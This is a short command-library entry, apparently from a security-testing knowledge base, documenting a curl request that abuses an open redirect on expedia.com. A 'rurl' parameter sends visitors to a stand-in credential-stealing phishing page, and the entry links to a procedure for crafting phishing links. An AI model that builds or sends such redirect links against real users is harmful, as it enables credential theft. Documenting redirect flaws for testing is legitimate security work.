---
id: cmd-curl-phishing-test
data: >-
  curl -X GET
  "https://www.expedia.com/?logout=1&rurl=https://fake-expedia-phish.com/steal-creds"
  -v
tags:
  - phishing
  - test
type: command
output: |-
  HTTP/2 302 
  Location: https://fake-expedia-phish.com/steal-creds
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:34.893Z'
verified: false
validated: true
submitted: true
---
# curl-phishing-test

## Command

```bash
curl -X GET "https://www.expedia.com/?logout=1&rurl=https://fake-expedia-phish.com/steal-creds" -v
```

## Description

Tests a full phishing link exploiting the open redirect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | GET | Yes |
| `-v` | Verbose | Yes |
| `rurl` | Phishing site | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.expedia.com/?logout=1&rurl=https://fake-expedia-phish.com/steal-creds" -v
```

### Advanced Usage

```bash
curl -X GET "...&rurl=phish.com" -v -L
```

## Expected Output

Redirect to phishing endpoint.

## Related

- [[Related Procedure: Craft-Phishing-Links-for-Social-Engineering]]
